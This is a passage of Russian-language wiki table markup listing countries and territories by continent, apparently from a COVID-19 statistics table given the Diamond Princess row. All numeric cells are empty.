|style="text-align:right"| ||Сирия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Йемен|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Уганда|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Новая Зеландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Багамы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Уругвай|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Иордания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мальта|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кипр|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Грузия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Латвия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ботсвана|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Аруба|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Буркина Фасо|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Либерия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ямайка|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Того|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нигер|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Андорра|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Вьетнам|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Чад|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Лесото|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Реюньон|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сан-Томе и Принсипи|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гайана|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Diamond Princess|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сан-Марино|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Тринидад и Тобаго|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Нормандские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Белиз|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гваделупа|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Танзания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Тайвань|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бурунди|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Коморы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мьянма|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Фарерские острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Синт-Мартен|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Папуа — Новая Гвинея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Маврикий|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Остров Мэн|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мартиника|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Теркс и Кайкос|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эритрея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Монголия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Камбоджа|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гибралтар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Французская Полинезия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Каймановы острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бермудские Острова|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Барбадос|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| || Бутан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Монако|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бруней|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сейшелы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сен-Мартен (владение Франции)|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Лихтенштейн|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Антигуа и Барбуда|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сент-Винсент и Гренадины|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Макао|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кюрасао|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Фиджи|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сент-Люсия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Восточный Тимор|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гренада|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Новая Каледония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Лаос|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Доминика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сент-Китс и Невис|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сен-Бартелеми (Карибы)|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гренландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Монтсеррат|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
